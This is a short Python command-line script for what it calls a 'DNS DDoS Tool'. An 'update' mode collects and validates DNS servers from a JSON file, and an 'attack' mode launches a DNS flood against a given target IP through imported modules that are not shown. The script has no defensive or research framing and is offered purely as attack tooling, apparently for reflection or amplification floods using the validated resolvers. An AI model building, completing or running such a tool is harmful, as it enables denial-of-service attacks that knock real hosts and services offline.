import argparse

from DataBaseOperator import DNSDatabaseManager
from DnsFlooder import DNSFlooder


def main():
    parser = argparse.ArgumentParser(description='DNS DDoS Tool')
    parser.add_argument('action', nargs='?', default=None, 
                        help='Action to perform: update, attack(require root privileges)')
    parser.add_argument('target', nargs='?', default=None, 
                        help='Target IP for attack or input file for update')
    
    args = parser.parse_args()
    
    db_manager = DNSDatabaseManager()
    dns_flooder = DNSFlooder(db_manager)
    
    if args.action == 'update':
        if args.target:
            print(f"Converting and validating DNS servers from {args.target}")
            db_manager.insert_from_json_file(args.target)
        

        validation_results = db_manager.validate_and_update_dns_servers()
        
        print("\nDNS Server Validation Results:")
        valid_servers = [r for r in validation_results if r['is_valid'] and r['is_responsive']]
        print(f"Total Servers: {len(validation_results)}")
        print(f"Valid and Responsive Servers: {len(valid_servers)}")
    
    elif args.action == 'attack' or (args.action is None and args.target):
        target = args.target if args.action == 'attack' else args.action
        
        
        print(f"Initiating DNS flood attack on {target}")
        dns_flooder.attack(target)
    
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
